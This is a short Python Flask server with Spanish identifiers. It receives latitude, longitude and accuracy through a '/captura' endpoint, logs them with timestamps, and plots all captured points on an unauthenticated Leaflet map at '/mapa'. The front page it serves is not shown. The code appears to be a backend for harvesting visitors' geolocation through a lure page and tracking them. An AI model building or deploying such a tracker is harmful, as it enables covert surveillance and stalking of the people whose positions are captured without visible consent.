from flask import Flask, request, send_from_directory, render_template_string
import datetime

app = Flask(__name__)

@app.route('/captura', methods=['POST'])
def captura():
    data = request.get_json()
    with open("ubicaciones.txt", "a") as f:
        f.write(f"{datetime.datetime.now()}|{data['lat']}|{data['lon']}|{data['acc']}\n")
    return 'OK', 200

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/mapa')
def mapa():
    ubicaciones = []
    try:
        with open("ubicaciones.txt", "r") as f:
            for linea in f:
                partes = linea.strip().split('|')
                if len(partes) == 4:
                    _, lat, lon, _ = partes
                    ubicaciones.append((float(lat), float(lon)))
    except FileNotFoundError:
        pass

    mapa_html = '''
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Mapa de Ubicaciones</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />
      <style>#map { height: 100vh; }</style>
    </head>
    <body>
    <div id="map"></div>

    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
    <script>
      const ubicaciones = {{ ubicaciones|tojson }};
      const map = L.map('map').setView([0, 0], 2);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors'
      }).addTo(map);

      ubicaciones.forEach(([lat, lon]) => {
        L.marker([lat, lon]).addTo(map);
      });

      if (ubicaciones.length > 0) {
        map.setView(ubicaciones[ubicaciones.length - 1], 15);
      }
    </script>
    </body>
    </html>
    '''
    return render_template_string(mapa_html, ubicaciones=ubicaciones)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)